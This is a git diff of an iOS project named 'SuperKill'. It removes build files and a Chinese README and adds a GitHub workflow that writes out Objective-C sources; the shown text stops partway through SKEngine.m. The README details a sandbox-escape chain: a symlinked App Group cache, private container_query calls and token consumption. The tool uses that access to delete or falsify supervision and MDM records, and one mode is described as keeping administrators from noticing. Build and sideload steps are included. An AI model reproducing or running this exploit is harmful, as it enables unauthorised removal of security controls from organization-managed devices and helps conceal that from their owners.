@@ -1,431 +1,1916 @@
-build/
-DerivedData/
-*.xcuserstate
-xcuserdata/
-.DS_Store
-*.ipa
-*.p12
-*.mobileprovision
-__pycache__/
-
-TARGET := iphone:clang:latest:17.0
-ARCHS := arm64 arm64e
-
-include $(THEOS)/makefiles/common.mk
-
-APPLICATION_NAME := SuperKill
-
-SuperKill_FILES := $(wildcard Sources/*.m)
-SuperKill_FRAMEWORKS := Foundation UIKit Security
-SuperKill_CODESIGN_FLAGS := -SEntitlements/SuperKill.entitlements
-SuperKill_INFOPLIST := Resources/Info.plist
-
-include $(THEOS_MAKE_PATH)/application.mk
-
-after-install::
-	install.exec "killall -9 SuperKill || true"
-
-name: SuperKill
-options:
-  bundleIdPrefix: cc.replace
-  createIntermediateGroups: true
-  deploymentTarget:
-    iOS: "17.0"
-
-settings:
-  base:
-    IPHONEOS_DEPLOYMENT_TARGET: "17.0"
-    CLANG_ENABLE_OBJC_ARC: YES
-    GENERATE_INFOPLIST_FILE: NO
-    SWIFT_VERSION: "5.0"
-    # 默认 App Group；出包时可用 SK_APP_GROUP=... 覆盖
-    SK_APP_GROUP: group.cc.replace.superkill
-
-targets:
-  SuperKill:
-    type: application
-    platform: iOS
-    sources:
-      - path: Sources
-    settings:
-      base:
-        PRODUCT_NAME: SuperKill
-        PRODUCT_BUNDLE_IDENTIFIER: cc.replace.superkill
-        INFOPLIST_FILE: Resources/Info.plist
-        CODE_SIGN_ENTITLEMENTS: Entitlements/SuperKill.entitlements
-        CODE_SIGN_STYLE: Automatic
-        DEVELOPMENT_TEAM: ""
-        TARGETED_DEVICE_FAMILY: "1,2"
-        OTHER_LDFLAGS: "-framework Foundation -framework UIKit -framework Security"
-    scheme:
-      gatherCoverageData: false
-
-# SuperKill
-
-基于 [`forcequitOS/worse_query`](https://github.com/forcequitOS/worse_query) 沙盒逃逸原语的 iOS **监管（Supervision）状态读写**工具：既能**清除**监管，也能**写入**监管（测试用），可直接编译成 IPA。
-
-- 目标系统：**iOS 26.0 – 26.7.2 / 27.2**（原语的生效窗口），不需要越狱
-- 原理：`containermanagerd` 在签发 App Group 的 sandbox token 时会解析符号链接 → 拿到**任意路径**的读写扩展 → 改写 `systemgroup.com.apple.configurationprofiles` 里的监管数据
-- 硬门槛：签名必须带 `com.apple.security.application-groups`，因此需要一个**付费 Apple Developer 账号**里注册过的 App Group
-- 功能：① 自检 · ② 检测监管 · ③ 备份 · **⑧ 状态快照** · **⑦ 开启监管（测试）** · ④ 彻底清除 · ⑤ 温和补丁 · **⑨ 快照 diff** · ⑥ 回滚
-
----
-
-## 0. 最短路径（Windows、没有 Mac 也能出包）
-
-```text
-① git push 到 GitHub（或 fork 一份）→ Actions → build-ipa → Run workflow
-② 跑完下载 artifact: SuperKill-unsigned-ipa
-③ 手机装 ESign / Feather：导入 .p12 + 含该 App Group 的 .mobileprovision，
-   签名页确认 entitlements 里有 com.apple.security.application-groups，安装
-④ 打开 App → 飞行模式 → ② 检测 → ③ 备份 → ④ 彻底清除（或 ⑦ 开启监管）→ 重启手机
-```
-
-有 Mac 就按第 4.1 节用 Xcode 直接跑，最省事（自动注册 App Group、自动签名）。
-
----
-
-## 1. 漏洞链（worse_query 到底做了什么）
-
-```
-① 你的 App 有一个 App Group 容器：
-   /private/var/mobile/Containers/Shared/AppGroup/<UUID>/
-② 把该容器的 Library/Caches 删掉，换成符号链接 → 任意目标路径：
-   .../Library/Caches -> /private/var/containers/Shared/SystemGroup/systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles
-③ 用 libsystem_containermanager 的私有 API 发一个 container_query：
-      container_query_set_class(query, 7)                      // 7 = appGroup，必须走 XPC 到 containermanagerd
-      container_query_set_group_identifiers(query, "你的group")
-      container_query_operation_set_part(query, 3)             // 3 = Library/Caches
-      container_query_operation_set_flags(query, 0x8000000000) // iOS 26 的 AppGroup 走 0x0800000000
-      container_query_get_single_result(query)
-④ containermanagerd 解析到符号链接的**真实目标**，为该路径签发 token：
-      container_copy_sandbox_token(result)
-⑤ 进程内 consume 掉 token：
-      sandbox_extension_consume(token)   // 返回 handle > 0 即成功
-⑥ 此后本进程对该路径拥有读写权限——尽管它在自己的沙盒之外。
-```
-
-关键点：`part 3` 让 containermanagerd 去算 “Library/Caches 的真实路径”，而 `class 7` 保证这次查询必须经 XPC 交给有权限的 `containermanagerd` 而不是进程内短路。符号链接是唯一的“注入点”，token 的路径授权却按解析后的目标发放——这就是 bug。
-
-工程里的 `worse_query.m` 会自动穷举 **2 组 flags × 2 种 identifier 形态**（string / xpc array），任一组合拿到 `handle > 0` 即成功；预检查只在 `errno == ENOENT` 时判定“目标不存在”，`EPERM` 说明只是沙盒不让 stat，照样继续去签发。
-
-`worse_query` 实测可达（原文 README）：
-
-```
-/var/containers/Data/System                         (iOS 27)
-/var/containers/Shared/SystemGroup/*                (iOS 27)
-/var/mobile/Containers/Data/Application/*
-/var/mobile/Containers/Data/InternalDaemon/*
-/var/mobile/Containers/Data/PluginKitPlugin/*
-/var/mobile/Containers/Shared/AppGroup/*
-```
-
-`/var/containers/Shared/SystemGroup/*` 这一条就是本工具的全部立足点。
-
----
-
-## 2. 为什么这样就等于“删除监管”
-
-监管与 MDM 的落盘状态集中在两个系统组容器里：
-
-| 路径 | 内容 |
-|---|---|
-| `/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles/CloudConfigurationDetails.plist` | `IsSupervised`、`IsMandatory`、`IsMDMUnremovable`、`OrganizationName`、`ConfigurationURL` —— 设置里“此 iPhone 受监管”就是读它 |
-| 同目录 `MDM.plist` | `ServerURL` / `CheckInURL` / `Topic` / `SignMessage` / `IdentityPersistentRef`，MDM 登记本体 |
-| 同目录 `MDMEvents.plist`、`MDMAppManagement.plist` | MDM 事件队列、托管 App 清单 |
-| 同目录 `PayloadManifest.plist` | `OrderedProfiles`，已安装 profile 的索引 |
-| 同目录 `<GUID>.stub` | 每个已安装 profile 的存根（MDM 推送的 profile 也在这里） |
-| `/private/var/mobile/Library/DeviceManagement/ClientTruth.plist` 等 | DeviceManagement 框架侧的镜像状态 |
-| `/private/var/mobile/Library/ConfigurationProfiles/` | 用户级 profile 存根 |
-
-把这些清掉（或把字段降权）后重启，`profiled` 重新读盘时就没有监管记录和 MDM 登记了，设置里既没有“受监管”，也没有“VPN 与设备管理”里的 MDM 描述文件。
-
----
-
-## 2.1 反向操作：开启监管（测试用）
-
-同一个文件、同样的写权限，反过来写就是“变成监管设备”——适合验证 MDM 策略、测试受监督设备才开放的功能（如单 App 模式、强制安装、禁用抹机等）。
-
-App 里点 **⑦ 开启监管**，会写入（`IsSupervised` 置真、其余字段按真实监管设备补齐）：
-
-| 键 | 写入值 |
-|---|---|
-| `IsSupervised` | `true` |
-| `IsMandatory` | `true` |
-| `IsMDMUnremovable` | `1` |
-| `IsMultiUser` | `false` |
-| `ConfigurationWasApplied` | `true` |
-| `OrganizationName` | 输入框里的值（默认 `Test Organization`） |
-| `OrganizationEmail` | 输入框里的值（可空则不写） |
-| `ConfigurationURL` | 输入框里的值（默认 `https://mdm.invalid/profile`） |
-| `LastModifiedTime` | 当前时间 |
-
-勾选「同时写入 MDM.plist 占位」时，额外写一份 `ServerURL` / `CheckInURL` / `Topic` / `SignMessage=false` 的占位，用来让“VPN 与设备管理”里出现条目。
-
-写入后立即读回校验 `IsSupervised`；**重启后生效**：设置首页显示“此 iPhone 受监管 + 组织名”，② 检测显示 `IsSupervised = 1`。测试完用 ④ 彻底清除即可切回普通设备，来回切换不需要重装 App。
-
-限制说明：
-
-- 这只是**本机状态位**，不会真的向任何 MDM 服务器注册。真正的 MDM 登记需要 APNs 证书签署的 `Topic` 与服务器下发，伪造的 `Topic`（`com.apple.mgmt.External.test`）不会建立推送通道。
-- 开启监管后，部分系统行为按受监督设备处理（例如“抹掉所有内容和设置”的入口、配置描述文件安装策略）；测试完务必清掉。
-- 若重启后没有出现“受监管”字样，说明该版本还会校验 `CloudConfigurationDetails.plist` 的属主/来源（本进程以 `mobile` 写入），需要越狱环境才能伪造；App 的日志里会给出读回结果。
-
----
-
-## 3. 工程结构
-
-```
-supervision-killer/
-├── project.yml                        XcodeGen 工程描述（主构建入口）
-├── Makefile                           Theos 构建（备选）
-├── Sources/
-│   ├── worse_query.h/.m               逃逸原语（自动尝试两组 flags、统一错误码、自动清理符号链接）
-│   ├── SKEngine.h/.m                  监管检测 / 备份 / 清除 / 补丁 / 开启监管 / 快照与 diff / 回滚
-│   ├── SKMainViewController.h/.m      操作台 UI
-│   ├── SKAppDelegate.h/.m
-│   └── main.m
-├── Resources/Info.plist               SKAppGroup = $(SK_APP_GROUP)
-├── Entitlements/SuperKill.entitlements 必须换成你自己的 App Group
-├── scripts/build_ipa.sh               一键出 unsigned IPA
-├── scripts/push_and_build.py          token 驱动：建仓 + 推送 + 触发 CI + 拉回 ipa
-├── scripts/sign_local.sh              macOS 本地重签（注入 entitlements）
-└── .github/workflows/build.yml         macOS runner 出包
-```
-
----
-
-## 4. 出包
-
-### 4.0 从零到装进手机（Windows 可用）
-
-**路径 1：网页上传，零工具（最省事）**
-
-1. github.com → New repository → 名字随意（如 `superkill`）→ Create
-2. 进入空仓库 → **uploading an existing file** → 把 `supervision-killer/` **里面的内容**（`Sources/`、`Resources/`、`Entitlements/`、`scripts/`、`.github/`、`project.yml`、`Makefile`、`README.md`）整个拖进去 → Commit
-   - 关键：`.github/` 必须在仓库根目录，否则 Actions 找不到 workflow
-3. 仓库顶部 **Actions** → 左侧 **build-ipa** → **Run workflow**（推上去时可能已自动跑一次）
-4. 约 3 分钟 → 运行页底部 **Artifacts** → 下载 `SuperKill-unsigned-ipa.zip` → 解压得到 `SuperKill-unsigned.ipa`
-5. 传进手机（文件 App / AirDrop / 局域网）→ 用 ESign 签（见下）
-
-**路径 2：一条命令，token 驱动（本机装了 Python 就行）**
-
-```bash
-# classic token 勾 repo + workflow；fine-grained 需要 Administration/Contents/Actions/Workflows 读写
-python scripts/push_and_build.py --token ghp_xxxxxxxx --repo superkill
-# 建仓 → 上传 → 触发 workflow → 等构建 → 自动下载解压
-# 产物：build/ipa/SuperKill-unsigned.ipa
-```
-
-**路径 3：装好 git 后常规推**
-
-```bash
-cd supervision-killer      # 这一层必须是仓库根（.github/ 在这里）
-git init -b main && git add . && git commit -m "SuperKill"
-git remote add origin https://github.com/<你的账号>/superkill.git
-git push -u origin main    # push 即触发 build-ipa
-```
-
-签名前确认三件事，缺一个都装不上或跑不起来：
-
-1. profile 的 App ID 与 ipa 的 bundle id 对得上（`cc.replace.superkill` 或你自己改的值）
-2. profile 里真的勾了 App Groups（免费 Apple ID 没有这个能力）
-3. ESign 的 entitlements 编辑器里有：
-
-```xml
-<key>com.apple.security.application-groups</key>
-<array><string>group.yourteam.superkill</string></array>
-```
-
-装好后打开 App，① 自检里 `Group 容器` 应为“可访问”。App 会通过 `xpc_copy_entitlement_for_self` 自动从自己的签名里读出 group，不需要手输；万一读不到（例如 entitlements 被签名工具剥掉），才需要在顶部输入框里手动填。
-
-### 4.1 路线 A：Xcode 真机（最省事）
-
-有 Mac 就不用管 CI / token / 未签名 ipa / ESign 这一整套：Xcode 会自动注册 App Group、生成描述文件、签名并安装。
-
-1. `brew install xcodegen && cd supervision-killer && xcodegen generate && open SuperKill.xcodeproj`
-2. Xcode → target `SuperKill` → **Signing & Capabilities**
-   - Team 选你的付费团队，Bundle Identifier 改成你自己的（例如 `com.yourname.superkill`）
-   - `+ Capability` → **App Groups** → 新建 `group.com.yourname.superkill` 并勾选
-   - Xcode 会把该 group 写进 `Entitlements/SuperKill.entitlements`，不用手改
-3. 连真机 → ⌘R 直接装上去跑
-4. 想留一份 ipa：Product → Archive → Distribute App → Development / Ad Hoc
-
-前提：Xcode 要新到能识别 iOS 26 设备（Xcode 26 及以上）；老版本 Xcode 会在“准备设备”阶段拒绝 iOS 26 真机。工程的最小系统版本是 17.0，与 SDK 无关。
-
-Xcode 是唯一能自动帮你注册 App Group + 生成描述文件的工具，这也是路线 A 推荐的原因。
-
-### 4.2 路线 B：CI 出未签名 IPA，自己重签
-
-```bash
-# 本机（macOS）：
-APP_GROUP=group.com.yourname.superkill BUNDLE_ID=com.yourname.superkill ./scripts/build_ipa.sh
-
-# 或者把仓库推到 GitHub，手动触发 build-ipa workflow，
-# 下载 artifact：SuperKill-unsigned-ipa
-```
-
-拿到 `SuperKill-unsigned.ipa` 后重签（**必须带 App Group，否则 App 里第 ① 步就会报 `code -1`**）：
-
-```bash
-./scripts/sign_local.sh SuperKill-unsigned.ipa \
-  "Apple Development: Your Name (TEAMID)" \
-  ~/Downloads/SuperKill_Dev.mobileprovision \
-  group.com.yourname.superkill
-
-xcrun devicectl device install app --device <UDID> Payload/SuperKill.app
-```
-
-用 ESign / Feather / Sideloadly 也可以，但要在签名界面把 entitlements 改成：
-
-```xml
-<key>com.apple.security.application-groups</key>
-<array><string>group.com.yourname.superkill</string></array>
-```
-
-并且**描述文件里必须真的包含这个 group**（门户 → Identifiers → App Groups 注册 → 关联到 App ID → 重新生成 profile）。免费 Apple ID 无法使用 App Groups，这一步绕不过去。
-
-### 4.3 路线 C：Theos
-
-```bash
-export THEOS=~/theos
-cd supervision-killer && make package install
-```
-
-`Makefile` 里已经把 `-SEntitlements/SuperKill.entitlements` 传给 `ldid`；同样要求 group 在本机/设备上可用（TrollStore 不支持 iOS 26，所以仍然只能靠带 group 的签名）。
-
-### 4.4 App Group 注册（门户操作）
-
-1. developer.apple.com → Certificates, Identifiers & Profiles → **Identifiers** → 右上角 `+` → **App Groups** → 填 `group.com.yourname.superkill`
-2. 回到 **App IDs** → 你的 App ID → Capabilities → 勾 **App Groups** → Configure → 选中刚建的组
-3. **Profiles** → 重新生成 Development profile（旧的没有 group 权限）
-4. 下载 `.mobileprovision`，连同 `.p12` 一起用于重签
-
----
-
-## 5. 操作流程（设备端）
-
-**A. 清除监管**
-
-```
-0. 打开飞行模式（阻断 MDM check-in，避免删完立刻被推回来）
-1. 安装并打开「监管开关」
-2. 顶部填 App Group（应与签名一致）→ 保存
-3. ① 自检        → 应看到 "ConfigurationProfiles: 扩展已取得（逃逸可用）"
-4. ② 检测监管状态 → 显示 IsSupervised / OrganizationName / MDM ServerURL，确认设备确实是监管设备
-5. ③ 备份         → 备份写到 App 的 Documents/backups/<时间戳>/（可用「文件」App 导出）
-6. ⑧ 记录快照     → 名字填「基线」，后面用来和清除后对照
-7. ④ 彻底清除     → 删除监管与 MDM 落盘状态
-8. 关机重启（保持飞行模式）
-9. 设置 → 通用 → VPN 与设备管理：MDM 描述文件应消失；设置首页不应再有“此 iPhone 受监管”
-10. 再关闭飞行模式联网验证；若监管被推回，说明是 ABM/DEP 注册设备（见第 7 节）
-```
-
-**B. 开启监管（测试闭环）**
-
-```
-0. 无需飞行模式（纯本机状态位）
-1. ⑧ 记录状态快照 → 名字填「基线」
-2. 在“开启监管参数”里填组织名 / 邮箱 / ConfigurationURL，按需打开 MDM.plist 占位开关
-3. ⑦ 开启监管 → 确认弹窗里核对参数 → 写入并读回校验
-4. ⑧ 再记录一份「开启后」→ ⑨ 对比快照链，应看到 + CloudConfigurationDetails.plist 与 IsSupervised: (无) → 1
-5. 重启设备：设置首页出现“此 iPhone 受监管”，② 检测显示 IsSupervised = 1
-6. 测完点 ④ 彻底清除 → ⑧ 记一份「清除后」→ 再重启，回到普通设备
-7. ⑨ 对比快照链，逐对 diff 能完整看到「基线 → 开启后 → 清除后 → 当前」的字段轨迹
-```
-
-开启前也可以先 ③ 备份，这样“开启 → 清除 → 回滚”三条状态都能互相对照。
-
-“⑤ 温和补丁”是另一条路：不删文件，只把 `IsSupervised` / `IsMandatory` 降为 `false`、`MDM.plist` 的 `ServerURL`/`CheckInURL` 指向 `https://127.0.0.1:1/`、`SignMessage=false`、清空 `MDMAppManagement.metadataByBundleID` 和 `PayloadManifest.OrderedProfiles`。适合“只想解除限制、不想让管理端发现设备掉线”的场景。
-
----
-
-## 5.1 快照与 diff（验证落盘效果）
-
-点 **⑧ 记录状态快照**，起个名字（`基线` / `开启后` / `清除后`），App 会把当前状态写进 `Documents/snapshots/<时间戳>-<名字>.plist`，采集内容：
-
-| 采集项 | 说明 |
-|---|---|
-| 三处目录条目 | `ConfigurationProfiles` / `DeviceManagement` / 用户 profile 目录：文件名、大小、是否目录 |
-| `cloud.*` | `CloudConfigurationDetails.plist` 里的 8 个键（IsSupervised、IsMandatory、IsMDMUnremovable、IsMultiUser、ConfigurationWasApplied、OrganizationName、OrganizationEmail、ConfigurationURL） |
-| `mdm.*` | `MDM.plist` 的 ServerURL / CheckInURL / Topic / SignMessage |
-| `clientTruth.*` | `DeviceManagement/ClientTruth.plist` 里 `CloudConfiguration` 子字典的 3 个键 |
-| `orderedProfiles` | `PayloadManifest.OrderedProfiles` 的条目数 |
-
-点 **⑨ 对比快照链**：按时间顺序逐对 diff，最后再和**当前实时状态**比一次。典型输出：
-
-```text
-共 3 份快照，逐对比较 + 最新快照 vs 当前
-
-=== 基线 @ 11-09 15:00:01  →  开启后 @ 11-09 15:04:22 ===
-监管: (无) → 1
-
-[ConfigurationProfiles]
-  + CloudConfigurationDetails.plist (612 B)
-  cloud.IsSupervised: (无) → 1
-  cloud.IsMandatory: (无) → 1
-  cloud.OrganizationName: (无) → Test Organization
-  cloud.ConfigurationURL: (无) → https://mdm.invalid/profile
-
-[DeviceManagement]
-  + CloudConfigurationDetails.plist (612 B)
-  clientTruth.IsSupervised: (无) → 1
-
-=== 开启后 @ 11-09 15:04:22  →  清除后 @ 11-09 15:09:40 ===
-监管: 1 → (无)
-
-[ConfigurationProfiles]
-  − CloudConfigurationDetails.plist (412 B)
-  cloud.IsSupervised: 1 → (无)
-  ...
-```
-
-diff 只报**结构变化**（新增 `+` / 删除 `−` / 大小变化 `~`）和**字段值变化**；不比较 mtime，避免 `profiled` 顺手改动造成的噪声。快照文件在 `Documents/snapshots/`，开了 `UIFileSharingEnabled`，可直接用「文件」App 拷出来存档或对比历史。
-
----
-
-## 6. 错误码
-
-| 返回 | 含义 | 处理 |
-|---|---|---|
-| `-1` | App Group 不存在 | 签名没带 `com.apple.security.application-groups`，或 group 未在门户注册/未勾进 profile |
-| `-2` | 符号解析失败 | 系统版本不在窗口期，或 `libsystem_containermanager.dylib` 路径变了 |
-| `-3` | query 创建失败 | 极少见，重试 |
-| `-4` | 符号链接创建失败 | 容器里 `Library/Caches` 权限异常，删掉 App 重装 |
-| `-5` | containermanagerd 拒绝 | flags/part 与系统不匹配（本工程已自动试两组 flags） |
-| `-6` | 内核拒绝签发扩展 | 目标路径不在可签发范围，或 token 被拒 |
-| `-255` | 目标不存在 | 该设备没有这个目录（例如未注册 MDM 就没有 `DeviceManagement`） |
-
----
-
-## 7. 限制（务必看）
-
-1. **不是永久解**。ABM / DEP（Apple Business Manager、Apple School Manager）注册的设备，联网激活时 `cloudconfigurationd` 会从 Apple 拉回监管记录；抹机、系统更新同样会回滚。非 DEP 的“Apple Configurator 手搓监管”设备，清除后一般能长期保持。
-2. **管理端会发现**。MDM 侧表现为设备停止 check-in；温和补丁模式下 profile 仍在但服务器地址已指向黑洞。
-3. **版本窗口**。原语只覆盖 iOS 26.0–26.7.2 / 27.2；更高版本随时可能被修掉（`container_query` 里加 `realpath` 校验即可）。
-4. **需要付费账号**。App Groups 是免费账号拿不到的能力，这是整条链上唯一无法用技术手段绕过的门槛。
-5. **别在清除前联网**。删完立刻联网 + MDM 服务器主动推 profile，可能当场回滚；先飞行模式，重启后再联网。
-6. **不做全盘抹除**。本工具只动配置与状态文件，不动用户数据。
-
----
-
-## 8. 回滚
-
-- App 内“⑥ 回滚最新备份”会把 `Documents/backups/<最新>/` 覆盖回三个目录。
-- 备份目录结构：`backups/<时间戳>/<序号>-<目录名>/…` + `roots.plist`（记录 slug → 原始路径）。
-- 彻底清除后如果没有备份：抹机重装是唯一的“还原”方式（监管状态由服务器决定，抹机后 DEP 设备会重新被监管）。
-
----
-
-## 9. 没有开发者账号时的备选路线
-
-| 路线 | 做法 | 代价 |
-|---|---|---|
-| 备份改写（无需漏洞） | iMazing / Apple 配置工具建本地备份 → 编辑 `SysSharedContainerDomain-systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles` → 删 `MDM.plist`、`MDMEvents.plist`、`CloudConfigurationDetails.plist` → 还原备份 | 需要还原备份，耗时；对 DEP 无效 |
-| 越狱 + Filza | 直接改第 2 节那批文件（jailbreak 下无沙盒限制） | iOS 26 目前没有公开越狱 |
-| MDM 官方移除 | 让管理方在 ABM/MDM 后台 “Release” 设备 | 需要管理方配合 |
-
----
-
-## 10. 许可
-
-`Sources/worse_query.{h,m}` 派生自 `forcequitOS/worse_query`（GPL-3.0），本工程整体按 GPL-3.0 分发。
+name: build-ipa-onefile
+
+# 单文件引导版：不需要上传任何文件夹，把本文件内容整段粘进 GitHub 的新建文件页即可。
+# 它会在 macOS runner 上写出源码 -> 生成工程 -> 编译 -> 产出未签名 ipa。
+
+on:
+  push:
+    branches: [ main, master ]
+  workflow_dispatch:
+
+jobs:
+  ipa:
+    runs-on: macos-latest
+    timeout-minutes: 25
+    env:
+      APP_GROUP: group.cc.replace.superkill
+      BUNDLE_ID: cc.replace.superkill
+    steps:
+      - name: 写入源码与工程文件
+        run: |
+          set -euo pipefail
+          mkdir -p Sources
+          cat > Sources/main.m <<'SK_EOF_00_MAIN_M'
+          //
+          //  main.m
+          //  SuperKill
+          //
+
+          #import <UIKit/UIKit.h>
+          #import "SKAppDelegate.h"
+
+          int main(int argc, char *argv[]) {
+              @autoreleasepool {
+                  return UIApplicationMain(argc, argv, nil, NSStringFromClass([SKAppDelegate class]));
+              }
+          }
+          SK_EOF_00_MAIN_M
+          mkdir -p Sources
+          cat > Sources/SKAppDelegate.h <<'SK_EOF_01_SKAPPDELEGATE_H'
+          //
+          //  SKAppDelegate.h
+          //  SuperKill
+          //
+
+          #import <UIKit/UIKit.h>
+
+          @interface SKAppDelegate : UIResponder <UIApplicationDelegate>
+
+          @property (nonatomic, strong) UIWindow *window;
+
+          @end
+          SK_EOF_01_SKAPPDELEGATE_H
+          mkdir -p Sources
+          cat > Sources/SKAppDelegate.m <<'SK_EOF_02_SKAPPDELEGATE_M'
+          //
+          //  SKAppDelegate.m
+          //  SuperKill
+          //
+
+          #import "SKAppDelegate.h"
+          #import "SKMainViewController.h"
+
+          @implementation SKAppDelegate
+
+          - (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
+              self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
+              SKMainViewController *root = [[SKMainViewController alloc] init];
+              UINavigationController *nav = [[UINavigationController alloc] initWithRootViewController:root];
+              self.window.rootViewController = nav;
+              [self.window makeKeyAndVisible];
+              return YES;
+          }
+
+          @end
+          SK_EOF_02_SKAPPDELEGATE_M
+          mkdir -p Sources
+          cat > Sources/SKEngine.h <<'SK_EOF_03_SKENGINE_H'
+          //
+          //  SKEngine.h
+          //  SuperKill
+          //
+          //  监管（Supervision）/ MDM 状态清除引擎。
+          //  通过 worse_query 取得 systemgroup.com.apple.configurationprofiles 的读写权限，
+          //  然后备份 / 删除 / 补丁 / 回滚监管相关 plist。
+          //
+
+          #import <Foundation/Foundation.h>
+
+          NS_ASSUME_NONNULL_BEGIN
+
+          typedef void (^SKLogBlock)(NSString *line);
+
+          /// 监管与 MDM 状态的系统级落盘位置（iOS 13 - 27 通用）
+          extern NSString *const SKConfigurationProfilesRoot;
+          extern NSString *const SKDeviceManagementRoot;
+          extern NSString *const SKUserProfilesRoot;
+
+          @interface SKEngine : NSObject
+
+          /// 日志回调，可能在任意线程被调用，UI 层自行切主线程
+          @property (nonatomic, copy, nullable) SKLogBlock logger;
+
+          /// 当前使用的 App Group（默认取 NSUserDefaults/Info.plist 的 SKAppGroup）
+          @property (nonatomic, readwrite, copy) NSString *appGroup;
+
+          + (NSString *)configuredAppGroup;
+          + (void)setConfiguredAppGroup:(NSString *)group;
+
+          /// 环境自检：系统版本、App Group、容器可访问性
+          - (NSString *)environmentReport;
+
+          /// 读取并汇报监管状态（组织名、IsSupervised、MDM ServerURL 等）
+          - (NSString *)inspectSupervision;
+
+          /// 最近一次检测到的 IsSupervised 值；未知返回 -1
+          - (NSInteger)supervisedState;
+
+          /// 备份三个根目录到 Documents/backups/<时间戳>/，返回备份目录路径
+          - (nullable NSString *)backup:(NSError **)error;
+
+          /// 彻底清除监管 + MDM 落盘状态（aggressive = 顺带清空所有 profile stub）
+          - (BOOL)wipeSupervision:(BOOL)aggressive error:(NSError **)error;
+
+          /// 温和模式：原地改写 plist，字段降权但保留文件（适合只想摆脱限制、保留 profile 的场景）
+          - (BOOL)patchSupervision:(NSError **)error;
+
+          /// 测试用反向操作：写入监管标记（IsSupervised / OrganizationName / ConfigurationURL 等），
+          /// 重启后设备会显示“此 iPhone 受监管”。withMDM 为真时同时写一份 MDM.plist 占位。
+          - (BOOL)enableSupervisionWithOrganization:(NSString *)organization
+                                             email:(NSString *)email
+                                  configurationURL:(NSString *)url
+                                           withMDM:(BOOL)withMDM
+                                             error:(NSError **)error;
+
+          /// 用 Documents/backups 里最新一份备份覆盖回去
+          - (BOOL)restoreLatestBackup:(NSError **)error;
+
+          #pragma mark - 快照与对比
+
+          /// 记录当前状态快照（Documents/snapshots/<时间戳>-<label>.plist），返回一行摘要
+          - (NSString *)captureSnapshotWithLabel:(NSString *)label;
+
+          /// 对快照链逐对做 diff，最后再和“当前实时状态”比一次；结果同时输出到日志
+          - (NSString *)diffSnapshotChain;
+
+          /// 释放所有已 consume 的扩展
+          - (void)releaseAllExtensions;
+
+          @end
+
+          NS_ASSUME_NONNULL_END
+          SK_EOF_03_SKENGINE_H
+          mkdir -p Sources
+          cat > Sources/SKEngine.m <<'SK_EOF_04_SKENGINE_M'
+          //
+          //  SKEngine.m
+          //  SuperKill
+          //
+
+          #import "SKEngine.h"
+          #import "worse_query.h"
+
+          #import <Foundation/Foundation.h>
+          #import <dlfcn.h>
+          #import <sys/stat.h>
+          #import <xpc/xpc.h>
+
+          NSString *const SKConfigurationProfilesRoot =
+          @"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles";
+          NSString *const SKDeviceManagementRoot = @"/private/var/mobile/Library/DeviceManagement";
+          NSString *const SKUserProfilesRoot = @"/private/var/mobile/Library/ConfigurationProfiles";
+
+          static NSString *const SKGroupDefaultsKey = @"SKAppGroup";
+          static NSString *const SKGroupUserSetKey = @"SKAppGroupUserSet";
+          static NSString *const SKGroupInfoKey = @"SKAppGroup";
+
+          #pragma mark - plist helpers
+
+          static BOOL SKWritePlist(id plist, NSString *path) {
+              if (!plist || path.length == 0) return NO;
+              NSError *error = nil;
+              NSData *data = [NSPropertyListSerialization dataWithPropertyList:plist
+                                                                        format:NSPropertyListXMLFormat_v1_0
+                                                                       options:0
+                                                                         error:&error];
+              if (!data) return NO;
+              return [data writeToFile:path options:NSDataWritingAtomic error:&error];
+          }
+
+          static id SKReadPlist(NSString *path) {
+              if (path.length == 0) return nil;
+              NSData *data = [NSData dataWithContentsOfFile:path];
+              if (!data) return nil;
+              return [NSPropertyListSerialization propertyListWithData:data
+                                                               options:NSPropertyListMutableContainersAndLeaves
+                                                                format:NULL
+                                                                 error:NULL];
+          }
+
+          #pragma mark - SKEngine
+
+          @interface SKEngine ()
+          @property (nonatomic, strong) NSMutableDictionary<NSString *, NSNumber *> *handles;
+          @property (nonatomic, assign) NSInteger supervisedState;
+
+          - (void)log:(NSString *)format, ... NS_FORMAT_FUNCTION(1, 2);
+          - (BOOL)hasAccessTo:(NSString *)path;
+          - (BOOL)grantAccessTo:(NSString *)root;
+          - (NSString *)hintForCode:(int64_t)code;
+          - (NSArray<NSString *> *)entriesIn:(NSString *)root;
+          - (BOOL)removeItem:(NSString *)path;
+          - (void)emptyPayloadManifestIn:(NSString *)root;
+          - (NSString *)backupsRoot;
+          - (void)mirrorCloudConfiguration:(NSDictionary *)cloud;
+
+          - (NSString *)snapshotsRoot;
+          - (NSDictionary *)captureState;
+          - (NSDictionary *)describeEntriesIn:(NSString *)root;
+          - (NSDictionary *)subsetOf:(NSDictionary *)dict keys:(NSArray<NSString *> *)keys;
+          - (NSString *)summarizeState:(NSDictionary *)state;
+          - (NSString *)snapshotTitle:(NSDictionary *)snapshot;
+          - (NSString *)valueText:(id)value;
+          - (NSString *)diffFrom:(NSDictionary *)left to:(NSDictionary *)right;
+          - (void)appendEntriesDiffFrom:(NSDictionary *)left
+                                     to:(NSDictionary *)right
+                                   into:(NSMutableString *)out;
+          - (void)appendValuesDiffFrom:(NSDictionary *)left
+                                    to:(NSDictionary *)right
+                               section:(NSString *)section
+                                  into:(NSMutableString *)out;
+          @end
+
+          @implementation SKEngine
+
+          - (instancetype)init {
+              if ((self = [super init])) {
+                  _handles = [NSMutableDictionary dictionary];
+                  _appGroup = [SKEngine configuredAppGroup];
+                  _supervisedState = -1;
+              }
+              return self;
+          }
+
+          + (NSString *)appGroupFromEntitlements {
+              // libxpc 导出 xpc_copy_entitlement_for_self()，用它读自己签名里的 app group，
+              // 这样自签后不需要手输 group，也不会因为填错而报 -1。
+              typedef xpc_object_t (*sk_copy_entitlement_fn)(const char *);
+              sk_copy_entitlement_fn copy = (sk_copy_entitlement_fn)dlsym(RTLD_DEFAULT, "xpc_copy_entitlement_for_self");
+              if (!copy) {
+                  void *libxpc = dlopen("/usr/lib/system/libxpc.dylib", RTLD_LAZY);
+                  if (libxpc) copy = (sk_copy_entitlement_fn)dlsym(libxpc, "xpc_copy_entitlement_for_self");
+              }
+              if (!copy) return nil;
